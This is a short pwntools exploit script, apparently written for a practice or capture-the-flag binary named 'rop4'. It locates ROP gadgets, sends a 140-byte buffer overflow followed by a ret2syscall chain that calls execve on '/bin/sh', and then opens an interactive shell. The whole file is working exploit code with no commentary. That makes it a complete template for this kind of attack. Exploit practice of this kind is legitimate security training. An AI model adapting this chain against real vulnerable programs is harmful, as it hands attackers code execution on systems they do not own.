from pwn import *

elf=ELF("./rop4")
#LIBC = ("./)

io=elf.process()

#ROP GADGETS !!!!!

ret = 0x80481cb
addesp_4 = 0x807e999
popret = 0x80481ec
pop2ret = 0x804859d
pop3ret = 0x804859c
pop4ret = 0x804859b

binsh=  0x80cbf4f

rop= ROP(elf)
pop_edx = (rop.find_gadget(['pop edx','ret']))[0]
pop_eax=(rop.find_gadget(['pop eax','ret']))[0]
pop_ebx=(rop.find_gadget(['pop ebx','ret']))[0]
pop_ecx =(rop.find_gadget(['pop ecx','ret']))[0]
ret =  rop.find_gadget(['ret'])[0]
int_fn = (rop.find_gadget(['int 0x80']))[0]
log.info("INT SYSCALL : " + hex(int_fn))
int_call=0x80cf3a7

log.info("int function : " + hex(int_fn))
log.info("pop_eax :" +hex(pop_eax))
log.info("pop_ebx :" + hex(pop_ebx))
log.info("pop_ecx :" + hex(pop_ecx))
log.info("rop :" + hex(ret))
log.info("pop_edx :" + hex(pop_edx))

gdb.attach(io)

payload = b'a'*140
payload += p32(pop_ebx)
payload += p32(binsh)
payload += p32(pop_ecx)
payload += p32(0)
payload += p32(pop_edx)
payload += p32(0)
payload += p32(pop_eax)
payload += p32(0xb)
#payload += p32(0x80)
payload += p32(int_fn)

io.sendline(payload)
io.interactive()
